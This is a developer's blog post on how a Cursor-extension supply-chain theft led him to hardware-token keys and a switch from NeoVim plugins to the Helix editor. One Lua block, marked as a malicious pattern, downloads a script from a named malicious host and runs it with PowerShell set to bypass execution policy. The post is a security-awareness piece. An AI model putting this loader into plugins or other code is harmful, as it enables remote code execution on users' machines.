---
title: My current development workflow and tools
date: 2025-07-24
author: Jose Storopoli
description: How supply chain devastating attacks made me change my mind recently.
tags: [programming, security]
---

![Ulysses and the Sirens](/images/ulisses-and-the-sirens.jpg)

I work with what I call "mission critical" software,
where we have the assumption that something really bad happens
when software crashes or misbehaves.
These include not only my current employer,
[Alpen Labs](https://alpenlabs.io),
but also a lot of open source software that I maintain
and contribute to, including my dearest [`dead-man-switch`](https://crates.io/crates/dead-man-switch),
and important ecosystem dependencies like
[`rust-bitcoin`](https://rust-bitcoin.org) and [BDK](https://bitcoindevkit.org).

My threat model encompass threats from nation-states like North Korea,
and major hacker groups.
Hence, I have a fairly tinfoil-hat approach on my professional role
and workflow.

## Don't leave private keys on "hot devices"

My main security measure is to move all private keys to hardware devices.
All my SSH and PGP keys live in hardware tokens like YubiKeys,
behind a PIN and a touch confirmation.
This pairs well with PGP signing all your commits
and flagging unsigned commits as unverified.
With this approach, if my computer is compromised,
it is really hard, dare I say impossible,
to produce a signed commit or to use a SSH key,
since it depends on:

1. Hardware device plugged in
1. Correct PIN entry (note that I use the KDF setting for my PIN to mitigate USB passive listening attacks)
1. Touch confirmation

As a bonus, almost all my accounts have a [FIDO](https://fidoalliance.org/)
2FA.

## Supply chain attacks

I was baffled by a recent supply chain attack that happened.
Someone lost USD 500,000 for using cursor extensions.
I encourage you to take a look at the full report
[here](https://securelist.com/open-source-package-for-cursor-ai-turned-into-a-crypto-heist/116908/),
the discussion at
[reddit](https://www.reddit.com/r/vscode/comments/1lxrxp9/someone_just_lost_500000_for_using_cursor/)
and also taking a look at this [YouTube video](https://youtu.be/CqKZhYsjw6M)
that does a post-morten on the whole thing:

<style>
  .embed-container {
    position: relative;
    padding-bottom: 56.25%;
    height: 0;
    overflow: hidden;
    max-width: 100%;
  }
  .embed-container iframe,
  .embed-container object,
  .embed-container embed {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
  }
</style>
<div class="embed-container">
  <iframe
    src="https://www.youtube.com/embed/CqKZhYsjw6M"
    frameborder="0"
    allowfullscreen
  ></iframe>
</div>

What surprised me in this supply chain attack is how legit was
the malicious extension.
I might have fallen for this,
of course with the caveat that maybe I would not lose $500k.
First, I don't have that kind of money,
and second, remember, my private keys never touches or resides in my computer;
i.e. my private keys are never "hot", always "cold".

I don't use VS Code or Cursor, and I can go on and on why that
fucking thing is way too bloated and a spyware;
but you can check my [soydev post](/posts/2023-11-10-soydev.html)
or my [JavaScript Antichrist rant](/posts/2024-11-10-road-less-travelled.html#avoiding-javascript).
But I did use NeoVim with a shitload of plugins[^zed].
The issue with NeoVim plugins is that all of plugin managers
blindly fetch code from GitHub repos,
without any attestation (PGP verification)
or integrity (SHA hash verification) measures.

[^zed]: {-} Note that this is not exclusively to VS Code or NeoVim,
  [Zed](https://zed.dev) also has external plugin support that blindly
  fetches code from GitHub repos without any checks that can execute
  arbitrary code in your computer.

The following Lua code is a direct translation of the evil JavaScript code
that the malicious extension had:

```lua
-- WARNING: This is malicious code pattern - DO NOT USE

local http = require("socket.http")
local io = require("io")
local os = require("os")

-- Function to download content from URL
function downloadScript(url)
    local response, status = http.request(url)
    if status == 200 then
        return response
    else
        return nil
    end
end

-- Function to execute PowerShell script
function executePowerShell(script)
    -- Write script to temporary file
    local tempFile = os.tmpname() .. ".ps1"
    local file = io.open(tempFile, "w")
    if file then
        file:write(script)
        file:close()

        -- Execute PowerShell script
        os.execute("powershell.exe -ExecutionPolicy Bypass -File \"" .. tempFile .. "\"")
      
        -- Clean up
        os.remove(tempFile)
    end
end

-- Main malicious logic
local maliciousUrl = "https://angelic.su/files/1.txt"
local script = downloadScript(maliciousUrl)

if script then
    executePowerShell(script)
end
```

Put this in any NeoVim plugin and BOOM! get pwned.
This is not hard to do since all it takes is a single malicious commit
in a plugin that is not so closely watched.
Pair that with the fact that one of the most popular NeoVim distributions,
[LazyVim](https://lazyvim.org),
by default configures the package manager to [update plugins automatically
**without notifying** the user](https://github.com/LazyVim/starter/blob/803bc181d7c0d6d5eeba9274d9be49b287294d99/lua/config/lazy.lua#L34-L37):

```lua
checker = {
  enabled = true, -- check for plugin updates periodically
  notify = false, -- notify on update
}, -- automatically check for plugin updates
```

and we have a time-bomb recipe for disaster.

Given these supply chain risks and my need for secure development practices,
I decided to overhaul my entire development workflow
to minimize external dependencies and attack vectors.

## Enter Helix

I made quite a few changes recently in my environment.
First, I cleaned up all my installed packages to the absolute bare minimum.
I use a MacBook as my main development machine.
I am trusting two package managers:
[Homebrew](https://brew.sh),
and [Nix](https://search.nixos.org).
Both of them have plenty of eyes in centralized GitHub repositories that act
as the main listing of packages, and perform integrity checks to mitigate
supply chain attacks.
I am fine with using both Homebrew and Nix as my package managers,
and being extra judicious on which packages I install[^nix].

[^nix]: {-} If I ever need a package or dependency that is seldom used,
  I can move that to a [Nix flake](https://wiki.nixos.org/wiki/Flakes)
  or a [Nix devshell](https://wiki.nixos.org/wiki/Development_environment_with_nix-shell);
  or just use it with `nix-shell -p foo`.

The second big change, was to move away from NeoVim and replace it for
[Helix](https://helix-editor.com).
[Helix](https://helix-editor.com) is a Rust-based modal editor very similar to NeoVim.
However, Helix is complete. It comes with all batteries included:
LSP, file picker, status line, treesitter integration, autoformatting, surround, etc.
Contrary to NeoVim, you don't need to install a shitload of plugins to make it
bare usable.
It is amazing straight out of the box.

I was already a happy Helix user in the past,
but I fell for NeoVim's plugins' siren call.
I did not tie myself to a mast like
[Ulysses](https://en.wikipedia.org/wiki/The_Sirens_and_Ulysses).
I've replaced my 1,000-line Lua [NeoVim config](https://github.com/storopoli/nvim)
for a very simple 61 lines of [Helix `config.toml`](https://gist.github.com/storopoli/e63b10dafdcc764f2bfe84f75c61e20a).

This tiny Helix configuration covers all my needs that I had to resort with
NeoVim plugins.
I had to add custom commands to cover two things that I've missed when switching:

1. **Copying permalinks to GitHub**.
   In NeoVim, I've solved this by using a plugin called
   [`gitlinker.nvim`](https://github.com/linrongbin16/gitlinker.nvim).
   Alas, not a problem, I asked Claude Code to try to reproduce the behavior,
   prompting it to take a look at `gitlinker.nvim`, and it produced this beautiful
   `sed` and `git` dark arts concoction that I can understand what is doing
   and it would take probably lots of hours for myself alone to come up with this
   solution:

   ```toml
   [keys.normal.space]
   o = [":sh echo \"$(git remote get-url origin | sed 's/\\.git$//' | sed 's/git@github\\.com:/https:\\/\\/github\\.com\\//')/blob/$(git rev-parse HEAD)/%{buffer_name}#L%{selection_line_start}-L%{selection_line_end}\" | pbcopy"]

   [keys.select.space]
   o = [":sh echo \"$(git remote get-url origin | sed 's/\\.git$//' | sed 's/git@github\\.com:/https:\\/\\/github\\.com\\//')/blob/$(git rev-parse HEAD)/%{buffer_name}#L%{selection_line_start}-L%{selection_line_end}\" | pbcopy"]
   ```

   I could make this more robust to varying `origin` sources like `codeberg.org`,
   or to Linux versus MacOS clipboard managers,
   but this is fine and addresses 99% of my needs.

1. **Reset git hunks**.
   In NeoVim, I used [`gitsigns.nvim`](https://github.com/lewis6991/gitsigns.nvim)
   to have friendly cues in the line gutter about version-controlled changes
   in my current buffer.
   Helix has that already built-in: no plugin needed.
   However, it does not expose a very common command that I use as a keybind:
   "reset hunk".
   No problem, I can just map the damn thing:

   ```toml
   [keys.normal]
   C-g = ":reset-diff-change"

   [keys.select]
   C-g = ":reset-diff-change"
   ```

Finally, there are two things that Helix brings to the table that I could not
find in NeoVim, even with plugins:

1. **Modal action philosophy**.
  In Vim and NeoVim, the philosophy is action then movement.
  First you specify an _action_, then you specify _what range_ you want to perform that action.
  For example "delete a word" is `dw`.
  In Helix, it is the opposite.
  First you specify a _range_ then _what action_ you want to perform.
  The example above, "delete a word", is `wd`.
  This is very nice because you get instant feedback loop on the range,
  and the action comes with no surprises.
  This flipped approach makes more intuitive sense to me.
1. **Local configurations**.
  Helix will scan for language and editor configurations in a `.helix/` sub-directory
  in your root directory.
  This is awesome, because you can add custom configuration for LSP and autoformatters,
  or any other language setting in a `.helix/languages.toml` file;
  or custom editor configurations in a `.helix/config.toml` file.
  This is paramount when comparing to NeoVim,
  where the [`exrc`](https://neovim.io/doc/user/starting.html#exrc) feature
  was always buggy and never worked for me without constant tinkering.

## Conclusion

Supply chain attacks are a real and growing threat in our development ecosystem.
By reducing external dependencies, using hardware tokens for authentication,
and choosing tools with fewer plugin requirements,
we can significantly reduce our attack surface.
The shift from NeoVim to Helix represents more than just a tool change ---
it's a security-conscious decision that maintains productivity while minimizing risk.
